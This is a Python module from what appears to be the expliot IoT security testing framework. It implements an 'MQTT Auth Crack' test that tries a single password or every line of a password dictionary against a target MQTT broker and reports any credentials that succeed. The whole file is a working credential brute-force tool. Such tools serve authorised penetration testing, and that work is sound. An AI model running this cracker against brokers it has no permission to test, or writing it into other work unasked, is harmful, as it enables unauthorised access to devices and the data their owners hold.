#
#
# expliot - Internet Of Things Security Testing and Exploitation Framework
# 
# Copyright (C) 2018  Aseem Jakhar
#
# Email:   aseemjakhar@gmail.com
# Twitter: @aseemjakhar
#
# THIS SOFTWARE IS PROVIDED ``AS IS'' AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING,
# BUT NOT LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A
# PARTICULAR PURPOSE ARE DISCLAIMED.  IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS
# BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL
# DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES;
# LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY
# THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE
# OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE
# POSSIBILITY OF SUCH DAMAGE.
#

from expliot.core.tests.test import *
from expliot.core.common.fileutils import readlines
from expliot.core.protocols.internet.mqtt import SimpleMqttClient

class MqttAuth(Test):

    def __init__(self):
        super().__init__(name     = "MQTT Auth Crack",
                         summary  = "MQTT authentication cracker",
                         descr    = """This test case attempts to crack the MQTT authentication with the specified
                                       credentials. You need specify the user and password or password dictionary""",
                         author   = "Aseem Jakhar",
                         email    = "aseemjakhar@gmail.com",
                         ref      = ["http://docs.oasis-open.org/mqtt/mqtt/v3.1.1/mqtt-v3.1.1.html"],
                         category = TCategory(TCategory.MQTT, TCategory.SW, TCategory.ANALYSIS),
                         target   = TTarget(TTarget.GENERIC, TTarget.GENERIC, TTarget.GENERIC))

        self.argparser.add_argument('-r', '--rhost', required=True,
                                    help="Hostname/IP address of the target MQTT broker")
        self.argparser.add_argument('-p', '--rport', default=1883, type=int,
                                    help="Port number of the target MQTT broker. Default is 1883")
        self.argparser.add_argument('-i', '--id',
                                    help="The client ID to be used for the connection. Default is random client ID")
        self.argparser.add_argument('-u', '--user',
                                    help="Specify the user name to be used")
        self.argparser.add_argument('-w', '--passwd',
                                    help="Specify the password to be used")
        self.argparser.add_argument('-f', '--pfile',
                                    help="""Specify the file containing passwords, one per line.
                                            If this option is present, --pass option will be ignored""")
        self.argparser.add_argument('-v', '--verbose', action="store_true",
                                    help="Show verbose output(Auth fails)")


    def execute(self):

        TLog.generic("Attempting to authenticate with the MQTT Broker ({}) on port ({})".format(self.args.rhost,
                                                                                                self.args.rport))
        found = False
        try:
            if self.args.pfile and self.args.user:
                for p in readlines(self.args.pfile):
                    r,s = SimpleMqttClient.connauth(self.args.rhost, clientid=self.args.id, user=self.args.user,
                                                    passwd=p, port=self.args.rport)
                    if r is 0:
                        TLog.success("FOUND - (user={})(passwd={})(return code={}:{})".format(self.args.user, p, r, s))
                        found = True
                        break
                    elif self.args.verbose:
                        TLog.fail("Auth failed - (user={})(passwd={})(return code={}:{})".format(self.args.user, p, r, s))
                if found is False:
                    self.result.setstatus(passed=False, reason="Auth failed for all passwords")
            else:
                r, s = SimpleMqttClient.connauth(self.args.rhost, clientid=self.args.id, user=self.args.user,
                                                 passwd=self.args.passwd, port=self.args.rport)
                if r is 0:
                    TLog.success("FOUND - (user={})(passwd={})(return code={}:{})".format(self.args.user,
                                                                                         self.args.passwd, r, s))
                else:
                    self.result.setstatus(passed=False, reason=s)
                    if self.args.verbose:
                        TLog.fail("Auth failed - (user={})(passwd={})(return code={}:{})".format(self.args.user,
                                                                                                self.args.passwd, r, s))
        except:
            self.result.exception()
